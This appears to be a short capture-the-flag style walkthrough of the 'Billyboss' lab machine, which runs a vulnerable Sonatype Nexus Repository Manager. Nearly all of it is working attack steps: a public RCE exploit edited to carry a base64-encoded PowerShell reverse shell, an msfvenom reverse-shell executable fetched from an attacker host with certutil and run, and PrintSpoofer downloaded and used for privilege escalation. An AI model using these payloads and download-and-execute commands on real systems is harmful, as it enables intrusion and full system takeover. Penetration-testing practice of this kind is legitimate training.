# Billyboss

### Enumeration

```
8081/tcp open  http    Jetty 9.4.18.v20190429
|_http-favicon: Unknown favicon MD5: 9A008BECDE9C5F250EDAD4F00E567721
| http-methods: 
|_  Supported Methods: GET HEAD
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-server-header: Nexus/3.21.0-05 (OSS)
|_http-title: Nexus Repository Manager
```

http://192.168.95.61:8081/ - Sonatype Nexus Repository Manager OSS 3.21.0-05

Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)

https://www.exploit-db.com/exploits/49385

We need admin credentials. Default creds did not work. Just simple guess :)

### Initial Access

[https://www.revshells.com/](https://www.revshells.com) - PowerShell #3 (Base64)

Edit the exploit as :

```
URL='http://192.168.95.61:8081'
CMD='cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADkANQAiACwAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
USERNAME='[REDACTED]'
PASSWORD='[REDACTED]'
```

```
$ python3 nexus.py
```

### PrivEsc

SeImpersonatePrivilege - Enabled

We should change shell to cmd for PrintSpoofer.exe.

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.95 LPORT=8081 -f exe -o shell.exe

PS C:\users\nathan\Desktop> certutil.exe -urlcache -split -f "http://192.168.49.95/shell.exe"
PS C:\users\nathan\Desktop> .\shell.exe
```

PrintSpoofer.exe - https://github.com/dievus/printspoofer

```
C:\users\nathan\Desktop> certutil.exe -urlcache -split -f "http://192.168.49.95/PrintSpoofer.exe"
C:\users\nathan\Desktop> PrintSpoofer.exe -i -c cmd
```
